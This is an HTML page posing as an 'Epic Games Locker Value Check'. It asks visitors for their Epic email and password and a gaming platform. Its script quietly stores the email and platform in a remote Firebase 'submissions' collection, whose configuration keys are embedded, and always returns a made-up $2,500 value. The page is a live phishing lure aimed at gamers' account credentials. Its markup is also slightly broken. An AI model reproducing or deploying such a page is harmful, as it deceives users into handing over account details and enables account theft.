


<!DOCTYPE html>
<html>
<head>
<title>Epic Games Locker Value Check</title>

<style>
body {
      background-image: url("locker.jpg");
    background-size: cover;
    background-position: center 10px;
    background-repeat: no-repeat;
    color: white;
    font-family: Arial, sans-serif;
    text-align: center;
    margin-top: 100px;

#result {
    background-color: #222;
    color: white;
    border: 1px solid #555;
    padding: 15px;
    width: 300px;
    margin: auto;
    border-radius: 8px;
}
}

h1 {
    color: #0a84ff;
}

input {
    background-color: #222;
    color:white;
    border: 1px solid #555;
    padding: 10px;
    width: 300px;
}

button {
    background-color: #0a84ff;
    color: white;
    border: none;
    padding: 10px 15px;
    cursor: pointer;
}
</style>

</head>
<body>

</h1>

<input id="messageBox" placeholder="Enter Email  ">
<br><br>

<input id="passwordbox" placeholder="Enter Password">

<br><br>

      
<select id="platform">
    <option>PC</option>
    <option>PlayStation</option>
    <option>Xbox</option>
    <option>Nintendo Switch</option>
    <option>Mobile</option>
</select>

<br><br> 
<button onclick="showResult()">Check Value</button>
 
<br><br>

<div id="result">
    Estimated Locker Value: $0
</div>







<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
import {
    getFirestore,
    collection,
    addDoc
} from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyAUPEGb0ickbE8QudGDhsTVwepswkiiNAE",
    authDomain: "epic-games-locker-check.firebaseapp.com",
    projectId: "epic-games-locker-check",
    storageBucket: "epic-games-locker-check.firebasestorage.app",
    messagingSenderId: "925269387598",
    appId: "1:925269387598:web:b9f3e1a34bd00eb2e6561f"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

window.showResult = async function () {
    const username = document.getElementById("messageBox").value;
    const platform = document.getElementById("platform").value;

    if (!username.trim()) {
        alert("Please enter an epic email and password");
        return;
    }

    try {
        await addDoc(collection(db, "submissions"), {
            username: username,
            platform: platform,
            date: new Date().toISOString()
        });

        document.getElementById("result").innerHTML =
            "Estimated Locker Value: $2,500";
    } catch (error) {
        console.error(error);
        alert("Error saving submission");
    }
};

</script>

</body>
</html>
